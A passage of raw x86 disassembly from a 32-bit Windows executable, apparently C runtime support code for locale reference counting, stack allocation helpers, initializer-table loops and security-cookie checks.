  407768:	e8 10 dc ff ff       	call   0x40537d
  40776d:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
  407770:	85 c9                	test   %ecx,%ecx
  407772:	75 0b                	jne    0x40777f
  407774:	8b 45 ec             	mov    -0x14(%ebp),%eax
  407777:	8b 40 08             	mov    0x8(%eax),%eax
  40777a:	8b c8                	mov    %eax,%ecx
  40777c:	89 45 1c             	mov    %eax,0x1c(%ebp)
  40777f:	33 c0                	xor    %eax,%eax
  407781:	33 ff                	xor    %edi,%edi
  407783:	39 45 20             	cmp    %eax,0x20(%ebp)
  407786:	57                   	push   %edi
  407787:	57                   	push   %edi
  407788:	ff 75 14             	push   0x14(%ebp)
  40778b:	0f 95 c0             	setne  %al
  40778e:	ff 75 10             	push   0x10(%ebp)
  407791:	8d 04 c5 01 00 00 00 	lea    0x1(,%eax,8),%eax
  407798:	50                   	push   %eax
  407799:	51                   	push   %ecx
  40779a:	ff 15 b8 d0 40 00    	call   *0x40d0b8
  4077a0:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4077a3:	85 c0                	test   %eax,%eax
  4077a5:	0f 84 99 00 00 00    	je     0x407844
  4077ab:	8d 1c 00             	lea    (%eax,%eax,1),%ebx
  4077ae:	8d 4b 08             	lea    0x8(%ebx),%ecx
  4077b1:	3b d9                	cmp    %ecx,%ebx
  4077b3:	1b c0                	sbb    %eax,%eax
  4077b5:	85 c1                	test   %eax,%ecx
  4077b7:	74 4a                	je     0x407803
  4077b9:	8d 4b 08             	lea    0x8(%ebx),%ecx
  4077bc:	3b d9                	cmp    %ecx,%ebx
  4077be:	1b c0                	sbb    %eax,%eax
  4077c0:	23 c1                	and    %ecx,%eax
  4077c2:	8d 4b 08             	lea    0x8(%ebx),%ecx
  4077c5:	3d 00 04 00 00       	cmp    $0x400,%eax
  4077ca:	77 19                	ja     0x4077e5
  4077cc:	3b d9                	cmp    %ecx,%ebx
  4077ce:	1b c0                	sbb    %eax,%eax
  4077d0:	23 c1                	and    %ecx,%eax
  4077d2:	e8 a9 48 00 00       	call   0x40c080
  4077d7:	8b f4                	mov    %esp,%esi
  4077d9:	85 f6                	test   %esi,%esi
  4077db:	74 60                	je     0x40783d
  4077dd:	c7 06 cc cc 00 00    	movl   $0xcccc,(%esi)
  4077e3:	eb 19                	jmp    0x4077fe
  4077e5:	3b d9                	cmp    %ecx,%ebx
  4077e7:	1b c0                	sbb    %eax,%eax
  4077e9:	23 c1                	and    %ecx,%eax
  4077eb:	50                   	push   %eax
  4077ec:	e8 0e ff ff ff       	call   0x4076ff
  4077f1:	8b f0                	mov    %eax,%esi
  4077f3:	59                   	pop    %ecx
  4077f4:	85 f6                	test   %esi,%esi
  4077f6:	74 45                	je     0x40783d
  4077f8:	c7 06 dd dd 00 00    	movl   $0xdddd,(%esi)
  4077fe:	83 c6 08             	add    $0x8,%esi
  407801:	eb 02                	jmp    0x407805
  407803:	8b f7                	mov    %edi,%esi
  407805:	85 f6                	test   %esi,%esi
  407807:	74 34                	je     0x40783d
  407809:	53                   	push   %ebx
  40780a:	57                   	push   %edi
  40780b:	56                   	push   %esi
  40780c:	e8 5f ad ff ff       	call   0x402570
  407811:	83 c4 0c             	add    $0xc,%esp
  407814:	ff 75 f8             	push   -0x8(%ebp)
  407817:	56                   	push   %esi
  407818:	ff 75 14             	push   0x14(%ebp)
  40781b:	ff 75 10             	push   0x10(%ebp)
  40781e:	6a 01                	push   $0x1
  407820:	ff 75 1c             	push   0x1c(%ebp)
  407823:	ff 15 b8 d0 40 00    	call   *0x40d0b8
  407829:	85 c0                	test   %eax,%eax
  40782b:	74 10                	je     0x40783d
  40782d:	ff 75 18             	push   0x18(%ebp)
  407830:	50                   	push   %eax
  407831:	56                   	push   %esi
  407832:	ff 75 0c             	push   0xc(%ebp)
  407835:	ff 15 0c d1 40 00    	call   *0x40d10c
  40783b:	8b f8                	mov    %eax,%edi
  40783d:	56                   	push   %esi
  40783e:	e8 27 00 00 00       	call   0x40786a
  407843:	59                   	pop    %ecx
  407844:	80 7d f4 00          	cmpb   $0x0,-0xc(%ebp)
  407848:	74 0a                	je     0x407854
  40784a:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40784d:	83 a0 50 03 00 00 fd 	andl   $0xfffffffd,0x350(%eax)
  407854:	8b c7                	mov    %edi,%eax
  407856:	8d 65 dc             	lea    -0x24(%ebp),%esp
  407859:	5f                   	pop    %edi
  40785a:	5e                   	pop    %esi
  40785b:	5b                   	pop    %ebx
  40785c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40785f:	33 cd                	xor    %ebp,%ecx
  407861:	e8 f8 99 ff ff       	call   0x40125e
  407866:	8b e5                	mov    %ebp,%esp
  407868:	5d                   	pop    %ebp
  407869:	c3                   	ret
  40786a:	8b ff                	mov    %edi,%edi
  40786c:	55                   	push   %ebp
  40786d:	8b ec                	mov    %esp,%ebp
  40786f:	8b 45 08             	mov    0x8(%ebp),%eax
  407872:	85 c0                	test   %eax,%eax
  407874:	74 12                	je     0x407888
  407876:	83 e8 08             	sub    $0x8,%eax
  407879:	81 38 dd dd 00 00    	cmpl   $0xdddd,(%eax)
  40787f:	75 07                	jne    0x407888
  407881:	50                   	push   %eax
  407882:	e8 e2 e3 ff ff       	call   0x405c69
  407887:	59                   	pop    %ecx
  407888:	5d                   	pop    %ebp
  407889:	c3                   	ret
  40788a:	8b ff                	mov    %edi,%edi
  40788c:	55                   	push   %ebp
  40788d:	8b ec                	mov    %esp,%ebp
  40788f:	8b 45 08             	mov    0x8(%ebp),%eax
  407892:	f0 ff 40 0c          	lock incl 0xc(%eax)
  407896:	8b 48 7c             	mov    0x7c(%eax),%ecx
  407899:	85 c9                	test   %ecx,%ecx
  40789b:	74 03                	je     0x4078a0
  40789d:	f0 ff 01             	lock incl (%ecx)
  4078a0:	8b 88 84 00 00 00    	mov    0x84(%eax),%ecx
  4078a6:	85 c9                	test   %ecx,%ecx
  4078a8:	74 03                	je     0x4078ad
  4078aa:	f0 ff 01             	lock incl (%ecx)
  4078ad:	8b 88 80 00 00 00    	mov    0x80(%eax),%ecx
  4078b3:	85 c9                	test   %ecx,%ecx
  4078b5:	74 03                	je     0x4078ba
  4078b7:	f0 ff 01             	lock incl (%ecx)
  4078ba:	8b 88 8c 00 00 00    	mov    0x8c(%eax),%ecx
  4078c0:	85 c9                	test   %ecx,%ecx
  4078c2:	74 03                	je     0x4078c7
  4078c4:	f0 ff 01             	lock incl (%ecx)
  4078c7:	56                   	push   %esi
  4078c8:	6a 06                	push   $0x6
  4078ca:	8d 48 28             	lea    0x28(%eax),%ecx
  4078cd:	5e                   	pop    %esi
  4078ce:	81 79 f8 40 46 41 00 	cmpl   $0x414640,-0x8(%ecx)
  4078d5:	74 09                	je     0x4078e0
  4078d7:	8b 11                	mov    (%ecx),%edx
  4078d9:	85 d2                	test   %edx,%edx
  4078db:	74 03                	je     0x4078e0
  4078dd:	f0 ff 02             	lock incl (%edx)
  4078e0:	83 79 f4 00          	cmpl   $0x0,-0xc(%ecx)
  4078e4:	74 0a                	je     0x4078f0
  4078e6:	8b 51 fc             	mov    -0x4(%ecx),%edx
  4078e9:	85 d2                	test   %edx,%edx
  4078eb:	74 03                	je     0x4078f0
  4078ed:	f0 ff 02             	lock incl (%edx)
  4078f0:	83 c1 10             	add    $0x10,%ecx
  4078f3:	83 ee 01             	sub    $0x1,%esi
  4078f6:	75 d6                	jne    0x4078ce
  4078f8:	ff b0 9c 00 00 00    	push   0x9c(%eax)
  4078fe:	e8 4e 01 00 00       	call   0x407a51
  407903:	59                   	pop    %ecx
  407904:	5e                   	pop    %esi
  407905:	5d                   	pop    %ebp
  407906:	c3                   	ret
  407907:	8b ff                	mov    %edi,%edi
  407909:	55                   	push   %ebp
  40790a:	8b ec                	mov    %esp,%ebp
  40790c:	51                   	push   %ecx
  40790d:	53                   	push   %ebx
  40790e:	56                   	push   %esi
  40790f:	8b 75 08             	mov    0x8(%ebp),%esi
  407912:	57                   	push   %edi
  407913:	8b 86 88 00 00 00    	mov    0x88(%esi),%eax
  407919:	85 c0                	test   %eax,%eax
  40791b:	74 6c                	je     0x407989
  40791d:	3d 50 46 41 00       	cmp    $0x414650,%eax
  407922:	74 65                	je     0x407989
  407924:	8b 46 7c             	mov    0x7c(%esi),%eax
  407927:	85 c0                	test   %eax,%eax
  407929:	74 5e                	je     0x407989
  40792b:	83 38 00             	cmpl   $0x0,(%eax)
  40792e:	75 59                	jne    0x407989
  407930:	8b 86 84 00 00 00    	mov    0x84(%esi),%eax
  407936:	85 c0                	test   %eax,%eax
  407938:	74 18                	je     0x407952
  40793a:	83 38 00             	cmpl   $0x0,(%eax)
  40793d:	75 13                	jne    0x407952
  40793f:	50                   	push   %eax
  407940:	e8 24 e3 ff ff       	call   0x405c69
  407945:	ff b6 88 00 00 00    	push   0x88(%esi)
  40794b:	e8 28 fb ff ff       	call   0x407478
  407950:	59                   	pop    %ecx
  407951:	59                   	pop    %ecx
  407952:	8b 86 80 00 00 00    	mov    0x80(%esi),%eax
  407958:	85 c0                	test   %eax,%eax
  40795a:	74 18                	je     0x407974
  40795c:	83 38 00             	cmpl   $0x0,(%eax)
  40795f:	75 13                	jne    0x407974
  407961:	50                   	push   %eax
  407962:	e8 02 e3 ff ff       	call   0x405c69
  407967:	ff b6 88 00 00 00    	push   0x88(%esi)
  40796d:	e8 04 fc ff ff       	call   0x407576
  407972:	59                   	pop    %ecx
  407973:	59                   	pop    %ecx
  407974:	ff 76 7c             	push   0x7c(%esi)
  407977:	e8 ed e2 ff ff       	call   0x405c69
  40797c:	ff b6 88 00 00 00    	push   0x88(%esi)
  407982:	e8 e2 e2 ff ff       	call   0x405c69
  407987:	59                   	pop    %ecx
  407988:	59                   	pop    %ecx
  407989:	8b 86 8c 00 00 00    	mov    0x8c(%esi),%eax
  40798f:	85 c0                	test   %eax,%eax
  407991:	74 45                	je     0x4079d8
  407993:	83 38 00             	cmpl   $0x0,(%eax)
  407996:	75 40                	jne    0x4079d8
  407998:	8b 86 90 00 00 00    	mov    0x90(%esi),%eax
  40799e:	2d fe 00 00 00       	sub    $0xfe,%eax
  4079a3:	50                   	push   %eax
  4079a4:	e8 c0 e2 ff ff       	call   0x405c69
  4079a9:	8b 86 94 00 00 00    	mov    0x94(%esi),%eax
  4079af:	bf 80 00 00 00       	mov    $0x80,%edi
  4079b4:	2b c7                	sub    %edi,%eax
  4079b6:	50                   	push   %eax
  4079b7:	e8 ad e2 ff ff       	call   0x405c69
  4079bc:	8b 86 98 00 00 00    	mov    0x98(%esi),%eax
  4079c2:	2b c7                	sub    %edi,%eax
  4079c4:	50                   	push   %eax
  4079c5:	e8 9f e2 ff ff       	call   0x405c69
  4079ca:	ff b6 8c 00 00 00    	push   0x8c(%esi)
  4079d0:	e8 94 e2 ff ff       	call   0x405c69
  4079d5:	83 c4 10             	add    $0x10,%esp
  4079d8:	ff b6 9c 00 00 00    	push   0x9c(%esi)
  4079de:	e8 97 00 00 00       	call   0x407a7a
  4079e3:	59                   	pop    %ecx
  4079e4:	6a 06                	push   $0x6
  4079e6:	58                   	pop    %eax
  4079e7:	8d 9e a0 00 00 00    	lea    0xa0(%esi),%ebx
  4079ed:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4079f0:	8d 7e 28             	lea    0x28(%esi),%edi
  4079f3:	81 7f f8 40 46 41 00 	cmpl   $0x414640,-0x8(%edi)
  4079fa:	74 1d                	je     0x407a19
  4079fc:	8b 07                	mov    (%edi),%eax
  4079fe:	85 c0                	test   %eax,%eax
  407a00:	74 14                	je     0x407a16
  407a02:	83 38 00             	cmpl   $0x0,(%eax)
  407a05:	75 0f                	jne    0x407a16
  407a07:	50                   	push   %eax
  407a08:	e8 5c e2 ff ff       	call   0x405c69
  407a0d:	ff 33                	push   (%ebx)
  407a0f:	e8 55 e2 ff ff       	call   0x405c69
  407a14:	59                   	pop    %ecx
  407a15:	59                   	pop    %ecx
  407a16:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407a19:	83 7f f4 00          	cmpl   $0x0,-0xc(%edi)
  407a1d:	74 16                	je     0x407a35
  407a1f:	8b 47 fc             	mov    -0x4(%edi),%eax
  407a22:	85 c0                	test   %eax,%eax
  407a24:	74 0c                	je     0x407a32
  407a26:	83 38 00             	cmpl   $0x0,(%eax)
  407a29:	75 07                	jne    0x407a32
  407a2b:	50                   	push   %eax
  407a2c:	e8 38 e2 ff ff       	call   0x405c69
  407a31:	59                   	pop    %ecx
  407a32:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407a35:	83 c3 04             	add    $0x4,%ebx
  407a38:	83 c7 10             	add    $0x10,%edi
  407a3b:	83 e8 01             	sub    $0x1,%eax
  407a3e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407a41:	75 b0                	jne    0x4079f3
  407a43:	56                   	push   %esi
  407a44:	e8 20 e2 ff ff       	call   0x405c69
  407a49:	59                   	pop    %ecx
  407a4a:	5f                   	pop    %edi
  407a4b:	5e                   	pop    %esi
  407a4c:	5b                   	pop    %ebx
  407a4d:	8b e5                	mov    %ebp,%esp
  407a4f:	5d                   	pop    %ebp
  407a50:	c3                   	ret
  407a51:	8b ff                	mov    %edi,%edi
  407a53:	55                   	push   %ebp
  407a54:	8b ec                	mov    %esp,%ebp
  407a56:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407a59:	85 c9                	test   %ecx,%ecx
  407a5b:	74 16                	je     0x407a73
  407a5d:	81 f9 e0 ee 40 00    	cmp    $0x40eee0,%ecx
  407a63:	74 0e                	je     0x407a73
  407a65:	33 c0                	xor    %eax,%eax
  407a67:	40                   	inc    %eax
  407a68:	f0 0f c1 81 b0 00 00 	lock xadd %eax,0xb0(%ecx)
  407a6f:	00 
  407a70:	40                   	inc    %eax
  407a71:	5d                   	pop    %ebp
  407a72:	c3                   	ret
  407a73:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  407a78:	5d                   	pop    %ebp
  407a79:	c3                   	ret
  407a7a:	8b ff                	mov    %edi,%edi
  407a7c:	55                   	push   %ebp
  407a7d:	8b ec                	mov    %esp,%ebp
  407a7f:	56                   	push   %esi
  407a80:	8b 75 08             	mov    0x8(%ebp),%esi
  407a83:	85 f6                	test   %esi,%esi
  407a85:	74 20                	je     0x407aa7
  407a87:	81 fe e0 ee 40 00    	cmp    $0x40eee0,%esi
  407a8d:	74 18                	je     0x407aa7
  407a8f:	8b 86 b0 00 00 00    	mov    0xb0(%esi),%eax
  407a95:	85 c0                	test   %eax,%eax
  407a97:	75 0e                	jne    0x407aa7
  407a99:	56                   	push   %esi
  407a9a:	e8 7c fb ff ff       	call   0x40761b
  407a9f:	56                   	push   %esi
  407aa0:	e8 c4 e1 ff ff       	call   0x405c69
  407aa5:	59                   	pop    %ecx
  407aa6:	59                   	pop    %ecx
  407aa7:	5e                   	pop    %esi
  407aa8:	5d                   	pop    %ebp
  407aa9:	c3                   	ret
  407aaa:	8b ff                	mov    %edi,%edi
  407aac:	55                   	push   %ebp
  407aad:	8b ec                	mov    %esp,%ebp
  407aaf:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407ab2:	85 c9                	test   %ecx,%ecx
  407ab4:	74 16                	je     0x407acc
  407ab6:	81 f9 e0 ee 40 00    	cmp    $0x40eee0,%ecx
  407abc:	74 0e                	je     0x407acc
  407abe:	83 c8 ff             	or     $0xffffffff,%eax
  407ac1:	f0 0f c1 81 b0 00 00 	lock xadd %eax,0xb0(%ecx)
  407ac8:	00 
  407ac9:	48                   	dec    %eax
  407aca:	5d                   	pop    %ebp
  407acb:	c3                   	ret
  407acc:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  407ad1:	5d                   	pop    %ebp
  407ad2:	c3                   	ret
  407ad3:	8b ff                	mov    %edi,%edi
  407ad5:	55                   	push   %ebp
  407ad6:	8b ec                	mov    %esp,%ebp
  407ad8:	8b 45 08             	mov    0x8(%ebp),%eax
  407adb:	85 c0                	test   %eax,%eax
  407add:	74 73                	je     0x407b52
  407adf:	f0 ff 48 0c          	lock decl 0xc(%eax)
  407ae3:	8b 48 7c             	mov    0x7c(%eax),%ecx
  407ae6:	85 c9                	test   %ecx,%ecx
  407ae8:	74 03                	je     0x407aed
  407aea:	f0 ff 09             	lock decl (%ecx)
  407aed:	8b 88 84 00 00 00    	mov    0x84(%eax),%ecx
  407af3:	85 c9                	test   %ecx,%ecx
  407af5:	74 03                	je     0x407afa
  407af7:	f0 ff 09             	lock decl (%ecx)
  407afa:	8b 88 80 00 00 00    	mov    0x80(%eax),%ecx
  407b00:	85 c9                	test   %ecx,%ecx
  407b02:	74 03                	je     0x407b07
  407b04:	f0 ff 09             	lock decl (%ecx)
  407b07:	8b 88 8c 00 00 00    	mov    0x8c(%eax),%ecx
  407b0d:	85 c9                	test   %ecx,%ecx
  407b0f:	74 03                	je     0x407b14
  407b11:	f0 ff 09             	lock decl (%ecx)
  407b14:	56                   	push   %esi
  407b15:	6a 06                	push   $0x6
  407b17:	8d 48 28             	lea    0x28(%eax),%ecx
  407b1a:	5e                   	pop    %esi
  407b1b:	81 79 f8 40 46 41 00 	cmpl   $0x414640,-0x8(%ecx)
  407b22:	74 09                	je     0x407b2d
  407b24:	8b 11                	mov    (%ecx),%edx
  407b26:	85 d2                	test   %edx,%edx
  407b28:	74 03                	je     0x407b2d
  407b2a:	f0 ff 0a             	lock decl (%edx)
  407b2d:	83 79 f4 00          	cmpl   $0x0,-0xc(%ecx)
  407b31:	74 0a                	je     0x407b3d
  407b33:	8b 51 fc             	mov    -0x4(%ecx),%edx
  407b36:	85 d2                	test   %edx,%edx
  407b38:	74 03                	je     0x407b3d
  407b3a:	f0 ff 0a             	lock decl (%edx)
  407b3d:	83 c1 10             	add    $0x10,%ecx
  407b40:	83 ee 01             	sub    $0x1,%esi
  407b43:	75 d6                	jne    0x407b1b
  407b45:	ff b0 9c 00 00 00    	push   0x9c(%eax)
  407b4b:	e8 5a ff ff ff       	call   0x407aaa
  407b50:	59                   	pop    %ecx
  407b51:	5e                   	pop    %esi
  407b52:	5d                   	pop    %ebp
  407b53:	c3                   	ret
  407b54:	6a 0c                	push   $0xc
  407b56:	68 40 28 41 00       	push   $0x412840
  407b5b:	e8 40 a0 ff ff       	call   0x401ba0
  407b60:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  407b64:	e8 bb dc ff ff       	call   0x405824
  407b69:	8b f8                	mov    %eax,%edi
  407b6b:	8b 0d a0 46 41 00    	mov    0x4146a0,%ecx
  407b71:	85 8f 50 03 00 00    	test   %ecx,0x350(%edi)
  407b77:	74 07                	je     0x407b80
  407b79:	8b 77 4c             	mov    0x4c(%edi),%esi
  407b7c:	85 f6                	test   %esi,%esi
  407b7e:	75 43                	jne    0x407bc3
  407b80:	6a 04                	push   $0x4
  407b82:	e8 5b ef ff ff       	call   0x406ae2
  407b87:	59                   	pop    %ecx
  407b88:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  407b8c:	ff 35 94 51 41 00    	push   0x415194
  407b92:	8d 47 4c             	lea    0x4c(%edi),%eax
  407b95:	50                   	push   %eax
  407b96:	e8 30 00 00 00       	call   0x407bcb
  407b9b:	59                   	pop    %ecx
  407b9c:	59                   	pop    %ecx
  407b9d:	8b f0                	mov    %eax,%esi
  407b9f:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  407ba2:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  407ba9:	e8 0c 00 00 00       	call   0x407bba
  407bae:	85 f6                	test   %esi,%esi
  407bb0:	75 11                	jne    0x407bc3
  407bb2:	e8 0e d7 ff ff       	call   0x4052c5
  407bb7:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  407bba:	6a 04                	push   $0x4
  407bbc:	e8 69 ef ff ff       	call   0x406b2a
  407bc1:	59                   	pop    %ecx
  407bc2:	c3                   	ret
  407bc3:	8b c6                	mov    %esi,%eax
  407bc5:	e8 26 a0 ff ff       	call   0x401bf0
  407bca:	c3                   	ret
  407bcb:	8b ff                	mov    %edi,%edi
  407bcd:	55                   	push   %ebp
  407bce:	8b ec                	mov    %esp,%ebp
  407bd0:	56                   	push   %esi
  407bd1:	8b 75 0c             	mov    0xc(%ebp),%esi
  407bd4:	57                   	push   %edi
  407bd5:	85 f6                	test   %esi,%esi
  407bd7:	74 3c                	je     0x407c15
  407bd9:	8b 45 08             	mov    0x8(%ebp),%eax
  407bdc:	85 c0                	test   %eax,%eax
  407bde:	74 35                	je     0x407c15
  407be0:	8b 38                	mov    (%eax),%edi
  407be2:	3b fe                	cmp    %esi,%edi
  407be4:	75 04                	jne    0x407bea
  407be6:	8b c6                	mov    %esi,%eax
  407be8:	eb 2d                	jmp    0x407c17
  407bea:	56                   	push   %esi
  407beb:	89 30                	mov    %esi,(%eax)
  407bed:	e8 98 fc ff ff       	call   0x40788a
  407bf2:	59                   	pop    %ecx
  407bf3:	85 ff                	test   %edi,%edi
  407bf5:	74 ef                	je     0x407be6
  407bf7:	57                   	push   %edi
  407bf8:	e8 d6 fe ff ff       	call   0x407ad3
  407bfd:	83 7f 0c 00          	cmpl   $0x0,0xc(%edi)
  407c01:	59                   	pop    %ecx
  407c02:	75 e2                	jne    0x407be6
  407c04:	81 ff 80 45 41 00    	cmp    $0x414580,%edi
  407c0a:	74 da                	je     0x407be6
  407c0c:	57                   	push   %edi
  407c0d:	e8 f5 fc ff ff       	call   0x407907
  407c12:	59                   	pop    %ecx
  407c13:	eb d1                	jmp    0x407be6
  407c15:	33 c0                	xor    %eax,%eax
  407c17:	5f                   	pop    %edi
  407c18:	5e                   	pop    %esi
  407c19:	5d                   	pop    %ebp
  407c1a:	c3                   	ret
  407c1b:	8b ff                	mov    %edi,%edi
  407c1d:	55                   	push   %ebp
  407c1e:	8b ec                	mov    %esp,%ebp
  407c20:	5d                   	pop    %ebp
  407c21:	e9 00 00 00 00       	jmp    0x407c26
  407c26:	8b ff                	mov    %edi,%edi
  407c28:	55                   	push   %ebp
  407c29:	8b ec                	mov    %esp,%ebp
  407c2b:	56                   	push   %esi
  407c2c:	8b 75 0c             	mov    0xc(%ebp),%esi
  407c2f:	85 f6                	test   %esi,%esi
  407c31:	74 1b                	je     0x407c4e
  407c33:	6a e0                	push   $0xffffffe0
  407c35:	33 d2                	xor    %edx,%edx
  407c37:	58                   	pop    %eax
  407c38:	f7 f6                	div    %esi
  407c3a:	3b 45 10             	cmp    0x10(%ebp),%eax
  407c3d:	73 0f                	jae    0x407c4e
  407c3f:	e8 b5 df ff ff       	call   0x405bf9
  407c44:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  407c4a:	33 c0                	xor    %eax,%eax
  407c4c:	eb 42                	jmp    0x407c90
  407c4e:	53                   	push   %ebx
  407c4f:	8b 5d 08             	mov    0x8(%ebp),%ebx
  407c52:	57                   	push   %edi
  407c53:	85 db                	test   %ebx,%ebx
  407c55:	74 0b                	je     0x407c62
  407c57:	53                   	push   %ebx
  407c58:	e8 b6 15 00 00       	call   0x409213
  407c5d:	59                   	pop    %ecx
  407c5e:	8b f8                	mov    %eax,%edi
  407c60:	eb 02                	jmp    0x407c64
  407c62:	33 ff                	xor    %edi,%edi
  407c64:	0f af 75 10          	imul   0x10(%ebp),%esi
  407c68:	56                   	push   %esi
  407c69:	53                   	push   %ebx
  407c6a:	e8 d7 15 00 00       	call   0x409246
  407c6f:	8b d8                	mov    %eax,%ebx
  407c71:	59                   	pop    %ecx
  407c72:	59                   	pop    %ecx
  407c73:	85 db                	test   %ebx,%ebx
  407c75:	74 15                	je     0x407c8c
  407c77:	3b fe                	cmp    %esi,%edi
  407c79:	73 11                	jae    0x407c8c
  407c7b:	2b f7                	sub    %edi,%esi
  407c7d:	8d 04 3b             	lea    (%ebx,%edi,1),%eax
  407c80:	56                   	push   %esi
  407c81:	6a 00                	push   $0x0
  407c83:	50                   	push   %eax
  407c84:	e8 e7 a8 ff ff       	call   0x402570
  407c89:	83 c4 0c             	add    $0xc,%esp
  407c8c:	5f                   	pop    %edi
  407c8d:	8b c3                	mov    %ebx,%eax
  407c8f:	5b                   	pop    %ebx
  407c90:	5e                   	pop    %esi
  407c91:	5d                   	pop    %ebp
  407c92:	c3                   	ret
  407c93:	ff 15 10 d1 40 00    	call   *0x40d110
  407c99:	85 c0                	test   %eax,%eax
  407c9b:	a3 a0 51 41 00       	mov    %eax,0x4151a0
  407ca0:	0f 95 c0             	setne  %al
  407ca3:	c3                   	ret
  407ca4:	83 25 a0 51 41 00 00 	andl   $0x0,0x4151a0
  407cab:	b0 01                	mov    $0x1,%al
  407cad:	c3                   	ret
  407cae:	8b ff                	mov    %edi,%edi
  407cb0:	55                   	push   %ebp
  407cb1:	8b ec                	mov    %esp,%ebp
  407cb3:	51                   	push   %ecx
  407cb4:	a1 00 40 41 00       	mov    0x414000,%eax
  407cb9:	33 c5                	xor    %ebp,%eax
  407cbb:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407cbe:	57                   	push   %edi
  407cbf:	8b 7d 08             	mov    0x8(%ebp),%edi
  407cc2:	3b 7d 0c             	cmp    0xc(%ebp),%edi
  407cc5:	75 04                	jne    0x407ccb
  407cc7:	b0 01                	mov    $0x1,%al
  407cc9:	eb 57                	jmp    0x407d22
  407ccb:	56                   	push   %esi
  407ccc:	8b f7                	mov    %edi,%esi
  407cce:	53                   	push   %ebx
  407ccf:	8b 1e                	mov    (%esi),%ebx
  407cd1:	85 db                	test   %ebx,%ebx
  407cd3:	74 0e                	je     0x407ce3
  407cd5:	8b cb                	mov    %ebx,%ecx
  407cd7:	ff 15 3c d1 40 00    	call   *0x40d13c
  407cdd:	ff d3                	call   *%ebx
  407cdf:	84 c0                	test   %al,%al
  407ce1:	74 08                	je     0x407ceb
  407ce3:	83 c6 08             	add    $0x8,%esi
  407ce6:	3b 75 0c             	cmp    0xc(%ebp),%esi
  407ce9:	75 e4                	jne    0x407ccf
  407ceb:	3b 75 0c             	cmp    0xc(%ebp),%esi
  407cee:	75 04                	jne    0x407cf4
  407cf0:	b0 01                	mov    $0x1,%al
  407cf2:	eb 2c                	jmp    0x407d20
  407cf4:	3b f7                	cmp    %edi,%esi
  407cf6:	74 26                	je     0x407d1e
  407cf8:	83 c6 fc             	add    $0xfffffffc,%esi
  407cfb:	83 7e fc 00          	cmpl   $0x0,-0x4(%esi)
  407cff:	74 13                	je     0x407d14
  407d01:	8b 1e                	mov    (%esi),%ebx
  407d03:	85 db                	test   %ebx,%ebx
  407d05:	74 0d                	je     0x407d14
  407d07:	6a 00                	push   $0x0
  407d09:	8b cb                	mov    %ebx,%ecx
  407d0b:	ff 15 3c d1 40 00    	call   *0x40d13c
  407d11:	ff d3                	call   *%ebx
  407d13:	59                   	pop    %ecx
  407d14:	83 ee 08             	sub    $0x8,%esi
  407d17:	8d 46 04             	lea    0x4(%esi),%eax
  407d1a:	3b c7                	cmp    %edi,%eax
  407d1c:	75 dd                	jne    0x407cfb
  407d1e:	32 c0                	xor    %al,%al
  407d20:	5b                   	pop    %ebx
  407d21:	5e                   	pop    %esi
  407d22:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407d25:	33 cd                	xor    %ebp,%ecx
  407d27:	5f                   	pop    %edi
  407d28:	e8 31 95 ff ff       	call   0x40125e
  407d2d:	8b e5                	mov    %ebp,%esp
  407d2f:	5d                   	pop    %ebp
  407d30:	c3                   	ret
  407d31:	8b ff                	mov    %edi,%edi
  407d33:	55                   	push   %ebp
  407d34:	8b ec                	mov    %esp,%ebp
  407d36:	51                   	push   %ecx
  407d37:	a1 00 40 41 00       	mov    0x414000,%eax
  407d3c:	33 c5                	xor    %ebp,%eax
  407d3e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407d41:	56                   	push   %esi
  407d42:	8b 75 0c             	mov    0xc(%ebp),%esi
  407d45:	39 75 08             	cmp    %esi,0x8(%ebp)
  407d48:	74 23                	je     0x407d6d
  407d4a:	83 c6 fc             	add    $0xfffffffc,%esi
  407d4d:	57                   	push   %edi
  407d4e:	8b 3e                	mov    (%esi),%edi
  407d50:	85 ff                	test   %edi,%edi
  407d52:	74 0d                	je     0x407d61
  407d54:	6a 00                	push   $0x0
  407d56:	8b cf                	mov    %edi,%ecx
  407d58:	ff 15 3c d1 40 00    	call   *0x40d13c
  407d5e:	ff d7                	call   *%edi
  407d60:	59                   	pop    %ecx
  407d61:	83 ee 08             	sub    $0x8,%esi
  407d64:	8d 46 04             	lea    0x4(%esi),%eax
  407d67:	3b 45 08             	cmp    0x8(%ebp),%eax
  407d6a:	75 e2                	jne    0x407d4e
  407d6c:	5f                   	pop    %edi
  407d6d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407d70:	b0 01                	mov    $0x1,%al
  407d72:	33 cd                	xor    %ebp,%ecx
  407d74:	5e                   	pop    %esi
  407d75:	e8 e4 94 ff ff       	call   0x40125e
  407d7a:	8b e5                	mov    %ebp,%esp
  407d7c:	5d                   	pop    %ebp
  407d7d:	c3                   	ret
  407d7e:	8b ff                	mov    %edi,%edi
  407d80:	55                   	push   %ebp
  407d81:	8b ec                	mov    %esp,%ebp
  407d83:	ff 75 08             	push   0x8(%ebp)
  407d86:	b9 a4 51 41 00       	mov    $0x4151a4,%ecx
  407d8b:	e8 07 c5 ff ff       	call   0x404297
  407d90:	5d                   	pop    %ebp
  407d91:	c3                   	ret
  407d92:	8b ff                	mov    %edi,%edi
  407d94:	55                   	push   %ebp
  407d95:	8b ec                	mov    %esp,%ebp
  407d97:	51                   	push   %ecx
  407d98:	a1 00 40 41 00       	mov    0x414000,%eax
  407d9d:	33 c5                	xor    %ebp,%eax
